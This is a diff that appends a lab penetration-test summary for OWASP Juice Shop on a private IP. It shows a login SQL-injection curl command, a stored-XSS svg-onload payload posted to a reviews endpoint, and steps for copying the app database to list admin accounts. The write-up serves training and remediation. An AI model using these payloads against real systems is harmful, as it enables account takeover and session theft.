@@ -229,3 +229,33 @@ End of report.
  - Product page HTML: artifacts/responses/product_1.html  
  - Product API raw: artifacts/responses/product_1_api_raw.txt  
 **Impact:** Stored XSS.  
+
+## PoC: Admin accounts & Stored XSS (2025-10-24) - quick summary
+**Target:** http://192.168.99.128:3000  
+**Author:** dinnie  
+**Date:** 2025-10-24
+
+### Summary
+Recovered the application SQLite DB from the local container, enumerated the `Users` table and confirmed multiple admin accounts. Also validated a stored-XSS payload on Product 1. All testing performed in lab environment only.
+
+### Key findings
+- DB located and copied: `~/lab/juice-shop/container_dump/juice-shop/data/juiceshop.sqlite` (local copy; removed after redaction/archival).
+- Admin user IDs (redacted evidence): `1, 4, 6, 9, 10, 12, 22`. See artifact: `~/lab/juice-shop/artifacts/idor/admin_users_redacted.csv`.
+- Stored XSS PoC (Product 1): payload `<p>poc-xss-01</p><svg/onload=console.log("poc-xss-01")>` stored via `POST /rest/products/1/reviews`. Artifacts: `~/lab/juice-shop/artifacts/requests/xss_payload.json`, `~/lab/juice-shop/artifacts/responses/xss_response_redacted.txt`.
+
+### Repro (high-level)
+1. Extract container files: `sudo docker cp <container>:/juice-shop ~/lab/juice-shop/container_dump`  
+2. Open local DB: `sqlite3 ~/lab/juice-shop/db_inspect/juice_shop.db` and query `Users` table.  
+3. Perform login SQLi (lab): `curl -X POST -d '{"email":"'\'' OR '\''1'\''='\''1'\''--","password":"password"}' http://192.168.99.128:3000/rest/user/login` to reproduce token generation (do not store tokens in notes).  
+4. Stored XSS PoC: `POST /rest/products/1/reviews` with payload; verify on `/product/1`.
+
+### Impact & remediation (brief)
+- **Impact:** Admin accounts & DB exposure in production would allow privilege escalation and data exfiltration. Stored XSS can result in session theft or CSRF in a real environment.  
+- **Remediation:** Protect `.git`/.env, do not publish DBs, validate/encode inputs, use CSP, avoid printing stack traces.
+
+### Artifacts (redacted, local)
+- `~/lab/juice-shop/artifacts/idor/admin_users_redacted.csv`  
+- `~/lab/juice-shop/artifacts/idor/whoami_db_admin.txt`  
+- `~/lab/juice-shop/artifacts/idor/enum_*` (automated enumeration outputs)  
+- `~/lab/juice-shop/artifacts/responses/xss_response_redacted.txt` and `~/lab/juice-shop/artifacts/requests/xss_payload.json`
+
